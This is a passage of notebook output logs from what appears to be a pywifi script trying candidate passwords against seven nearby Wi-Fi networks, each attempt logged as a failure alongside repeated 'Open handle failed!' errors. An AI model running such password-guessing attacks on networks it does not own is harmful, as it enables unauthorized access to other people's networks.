     "text": [
      "num= 67 Fail Current WifiName: BP2197 Current Password: 169882KeV\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:25:07,588 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 67 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 169882KeV\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:25:13,155 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 67 Fail Current WifiName: whhh Current Password: 169882KeV\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:25:18,169 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 67 Fail Current WifiName: Ruoshui317 Current Password: 169882KeV\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:25:23,735 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 67 Fail Current WifiName: 311 Current Password: 169882KeV\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:25:29,303 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 67 Fail Current WifiName: 321sushe Current Password: 169882KeV\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:25:34,873 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 67 Fail Current WifiName: 313 Current Password: 169882KeV\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:25:40,446 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 68 Fail Current WifiName: BP2197 Current Password: AGU82269444\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:25:46,013 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 68 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: AGU82269444\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:25:51,579 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 68 Fail Current WifiName: whhh Current Password: AGU82269444\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:25:56,593 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 68 Fail Current WifiName: Ruoshui317 Current Password: AGU82269444\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:26:02,164 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 68 Fail Current WifiName: 311 Current Password: AGU82269444\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:26:07,743 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 68 Fail Current WifiName: 321sushe Current Password: AGU82269444\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:26:13,317 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 68 Fail Current WifiName: 313 Current Password: AGU82269444\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:26:18,885 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 69 Fail Current WifiName: BP2197 Current Password: 26749876vv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:26:24,458 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 69 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 26749876vv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:26:30,044 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 69 Fail Current WifiName: whhh Current Password: 26749876vv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:26:35,065 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 69 Fail Current WifiName: Ruoshui317 Current Password: 26749876vv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:26:40,644 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 69 Fail Current WifiName: 311 Current Password: 26749876vv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:26:46,223 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 69 Fail Current WifiName: 321sushe Current Password: 26749876vv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:26:51,799 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 69 Fail Current WifiName: 313 Current Password: 26749876vv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:26:57,370 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 71 Fail Current WifiName: BP2197 Current Password: 84961910BFx\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:27:02,936 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 71 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 84961910BFx\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:27:08,517 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 71 Fail Current WifiName: whhh Current Password: 84961910BFx\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:27:13,537 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 71 Fail Current WifiName: Ruoshui317 Current Password: 84961910BFx\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:27:19,109 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 71 Fail Current WifiName: 311 Current Password: 84961910BFx\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:27:24,682 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 71 Fail Current WifiName: 321sushe Current Password: 84961910BFx\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:27:30,256 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 71 Fail Current WifiName: 313 Current Password: 84961910BFx\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:27:35,829 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 72 Fail Current WifiName: BP2197 Current Password: Xsp1694975\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:27:41,400 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 72 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: Xsp1694975\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:27:46,968 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 72 Fail Current WifiName: whhh Current Password: Xsp1694975\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:27:51,987 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 72 Fail Current WifiName: Ruoshui317 Current Password: Xsp1694975\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:27:57,568 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 72 Fail Current WifiName: 311 Current Password: Xsp1694975\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:28:03,134 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 72 Fail Current WifiName: 321sushe Current Password: Xsp1694975\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:28:08,705 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 72 Fail Current WifiName: 313 Current Password: Xsp1694975\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:28:14,289 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 75 Fail Current WifiName: BP2197 Current Password: 4007907Hb\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:28:19,863 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 75 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 4007907Hb\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:28:25,438 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 75 Fail Current WifiName: whhh Current Password: 4007907Hb\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:28:30,459 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 75 Fail Current WifiName: Ruoshui317 Current Password: 4007907Hb\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:28:36,039 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 75 Fail Current WifiName: 311 Current Password: 4007907Hb\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:28:41,604 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 75 Fail Current WifiName: 321sushe Current Password: 4007907Hb\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:28:47,172 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 75 Fail Current WifiName: 313 Current Password: 4007907Hb\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:28:52,758 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 76 Fail Current WifiName: BP2197 Current Password: OR174312\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:28:58,330 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 76 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: OR174312\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:29:03,903 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 76 Fail Current WifiName: whhh Current Password: OR174312\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:29:08,920 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 76 Fail Current WifiName: Ruoshui317 Current Password: OR174312\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:29:14,500 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 76 Fail Current WifiName: 311 Current Password: OR174312\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:29:20,070 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 76 Fail Current WifiName: 321sushe Current Password: OR174312\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:29:25,645 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 76 Fail Current WifiName: 313 Current Password: OR174312\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:29:31,219 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 77 Fail Current WifiName: BP2197 Current Password: 83237998PJ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:29:36,793 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 77 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 83237998PJ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:29:42,360 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 77 Fail Current WifiName: whhh Current Password: 83237998PJ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:29:47,372 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 77 Fail Current WifiName: Ruoshui317 Current Password: 83237998PJ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:29:52,954 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 77 Fail Current WifiName: 311 Current Password: 83237998PJ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:29:58,549 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 77 Fail Current WifiName: 321sushe Current Password: 83237998PJ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:30:04,129 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 77 Fail Current WifiName: 313 Current Password: 83237998PJ\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:30:09,695 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 78 Fail Current WifiName: BP2197 Current Password: Fl29185269\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:30:15,269 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 78 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: Fl29185269\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:30:20,838 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 78 Fail Current WifiName: whhh Current Password: Fl29185269\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:30:25,859 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 78 Fail Current WifiName: Ruoshui317 Current Password: Fl29185269\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:30:31,430 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 78 Fail Current WifiName: 311 Current Password: Fl29185269\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:30:37,007 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 78 Fail Current WifiName: 321sushe Current Password: Fl29185269\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:30:42,578 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 78 Fail Current WifiName: 313 Current Password: Fl29185269\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:30:48,153 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 79 Fail Current WifiName: BP2197 Current Password: 67888150zP\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:30:53,727 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 79 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 67888150zP\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:30:59,313 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 79 Fail Current WifiName: whhh Current Password: 67888150zP\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:31:04,328 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 79 Fail Current WifiName: Ruoshui317 Current Password: 67888150zP\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:31:09,901 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 79 Fail Current WifiName: 311 Current Password: 67888150zP\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:31:15,696 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 79 Fail Current WifiName: 321sushe Current Password: 67888150zP\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:31:21,265 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 79 Fail Current WifiName: 313 Current Password: 67888150zP\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:31:26,840 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 80 Fail Current WifiName: BP2197 Current Password: ht06886185\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:31:32,408 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 80 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: ht06886185\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:31:37,983 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 80 Fail Current WifiName: whhh Current Password: ht06886185\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:31:43,000 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 80 Fail Current WifiName: Ruoshui317 Current Password: ht06886185\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:31:48,572 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 80 Fail Current WifiName: 311 Current Password: ht06886185\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:31:53,595 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 80 Fail Current WifiName: 321sushe Current Password: ht06886185\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:31:59,162 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 80 Fail Current WifiName: 313 Current Password: ht06886185\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:32:04,731 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 81 Fail Current WifiName: BP2197 Current Password: 548428hv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:32:10,300 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 81 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 548428hv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:32:15,875 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 81 Fail Current WifiName: whhh Current Password: 548428hv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:32:20,903 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 81 Fail Current WifiName: Ruoshui317 Current Password: 548428hv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:32:26,473 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 81 Fail Current WifiName: 311 Current Password: 548428hv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:32:31,492 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 81 Fail Current WifiName: 321sushe Current Password: 548428hv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:32:37,061 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 81 Fail Current WifiName: 313 Current Password: 548428hv\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:32:42,634 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 83 Fail Current WifiName: BP2197 Current Password: 524278YRB\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:32:48,226 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 83 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: 524278YRB\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:32:53,798 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 83 Fail Current WifiName: whhh Current Password: 524278YRB\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:32:58,817 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 83 Fail Current WifiName: Ruoshui317 Current Password: 524278YRB\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:33:04,388 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 83 Fail Current WifiName: 311 Current Password: 524278YRB\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:33:09,407 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 83 Fail Current WifiName: 321sushe Current Password: 524278YRB\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:33:14,974 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 83 Fail Current WifiName: 313 Current Password: 524278YRB\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:33:20,546 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 84 Fail Current WifiName: BP2197 Current Password: qru6230997\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:33:26,122 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 84 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: qru6230997\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:33:31,692 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 84 Fail Current WifiName: whhh Current Password: qru6230997\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:33:36,708 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 84 Fail Current WifiName: Ruoshui317 Current Password: qru6230997\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:33:42,276 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 84 Fail Current WifiName: 311 Current Password: qru6230997\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:33:47,291 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 84 Fail Current WifiName: 321sushe Current Password: qru6230997\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:33:52,865 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 84 Fail Current WifiName: 313 Current Password: qru6230997\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:33:58,451 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 86 Fail Current WifiName: BP2197 Current Password: Ucr552516\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:34:04,025 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 86 Fail Current WifiName: Xiaomi_4D0F_5G Current Password: Ucr552516\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "pywifi 2020-05-03 03:34:09,603 ERROR Open handle failed!\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "num= 86 Fail Current WifiName: whhh Current Password: Ucr552516\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
